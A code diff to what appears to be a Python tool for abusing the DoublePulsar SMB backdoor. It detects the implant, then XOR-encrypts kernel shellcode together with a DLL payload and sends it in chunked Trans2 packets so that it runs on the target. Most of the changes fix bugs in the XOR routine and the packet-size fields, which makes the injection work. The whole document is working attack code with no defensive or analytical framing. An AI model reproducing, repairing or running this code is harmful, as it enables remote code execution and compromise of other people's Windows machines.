@@ -93,9 +93,14 @@ print("Bytes: ", " ".join(f"{byte:02X}" for byte in result))
 '''
 
 def byte_xor(data, key):
+    key_bytes = key.to_bytes(4, byteorder='little')
+    key_length = len(key_bytes)
+    '''
     for i in range(len(data)):
-        data[i] ^= key[i % len(key)]
-    return
+        data[i] ^= key_bytes[i % key_length]
+    return data
+    '''
+    return bytearray(data[i] ^ key_bytes[i % key_length] for i in range(len(data)))
 
 
 rundll_kernel_shellcode = b"\x48\x89\xE0\x66\x83\xE4\xF0\x41\x57\x41\x56\x41\x55\x41\x54\x53"
@@ -397,8 +402,8 @@ if __name__ == "__main__":
 
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
 
-        byte_xor_key = struct.pack('<I', key)
-        print(hexdump(byte_xor_key))
+        #byte_xor_key = struct.pack('<I', key)
+        #print(hexdump(byte_xor_key))
         #bytes_xor_key = int2le(byte_xor_key, 0)
         #print(hexdump(bytes_xor_key))
 
@@ -438,12 +443,12 @@ if __name__ == "__main__":
         bytearray_rundll_kernel_shellcode[offset_dll_ordinal: offset_dll_ordinal + 4] = dll_ordinal
         #print(hexdump(bytearray_rundll_kernel_shellcode))
 
-        EncryptedPayload = bytearray()
-        EncryptedPayload += bytearray_rundll_kernel_shellcode
-        EncryptedPayload += bytearray_hex_bytes
-        byte_xor(EncryptedPayload, byte_xor_key)
+        TotalPayload = bytearray()
+        TotalPayload += bytearray_rundll_kernel_shellcode
+        TotalPayload += bytearray_hex_bytes
+        xor_bytes = byte_xor(TotalPayload, key)
 
-        total_payload_size = len(EncryptedPayload)
+        total_payload_size = len(xor_bytes)
         iterations = total_payload_size / 4096
         remainder = total_payload_size % 4096
         print("we will send %d packets ( full 4096 byte packets )" % iterations)
@@ -463,10 +468,10 @@ if __name__ == "__main__":
         for i in range(times):
             doublepulsar_exec_packet = bytearray(trans2_exec_packet)
             print("[%d] sending a packet!" % i)
-            payload_chunk = EncryptedPayload[Offset:4096]
+            payload_chunk = xor_bytes[Offset:4096]
             # some_bytes = b''.join([hex_bytes[Offset: Offset + 4096] for i in range(0, len(hex_bytes), 4096)])
 
-            chunk = b''.join([EncryptedPayload[Offset: Offset + 4096]])
+            chunk = b''.join([xor_bytes[Offset: Offset + 4096]])
             '''
             since our payload is less than 4096, we can send the packet in one packet.
             it is possible for the EntireSize to be 5 MB in bytes
@@ -475,19 +480,19 @@ if __name__ == "__main__":
             '''
             EntireSize = struct.pack('<I', EntirePayloadSize)  # entire value of the payload being uploaded
             ChunkSize = struct.pack('<I', 4096)  # using the same value since chunk size is less than 4096
-            offset = struct.pack('<I',Offset)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
+            PayloadOffset = struct.pack('<I', Offset)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
 
             parameters = b''
             parameters += EntireSize
             parameters += ChunkSize
-            parameters += offset
+            parameters += PayloadOffset
 
             parameters_bytearray = bytearray(parameters)
             print(hexdump(parameters_bytearray))
-            byte_xor(parameters_bytearray,byte_xor_key)
+            xor_parameters = byte_xor(parameters_bytearray, key)
             print(hexdump(parameters_bytearray))
 
-            doublepulsar_exec_packet += parameters_bytearray
+            doublepulsar_exec_packet += xor_parameters
             doublepulsar_exec_packet += chunk
 
             # update values for tree ID and user ID
@@ -519,10 +524,10 @@ if __name__ == "__main__":
             last_doublepulsar_exec_packet[2] = smb_length[0]
             last_doublepulsar_exec_packet[3] = smb_length[1]
 
-            # <I = Little Endian unsigned integer
-            TotalDataCount = struct.pack('<I', remainder)
-            DataCount = struct.pack('<I', remainder)
-            ByteCount = struct.pack('<I', remainder + 13)
+            # <I = Little Endian unsigned short
+            TotalDataCount = struct.pack('<H', remainder)
+            DataCount = struct.pack('<H', remainder)
+            ByteCount = struct.pack('<H', remainder + 13)
 
             # last_payload_chunk = hex_bytes[Offset:remainder]
             # print(hexdump(last_payload_chunk))
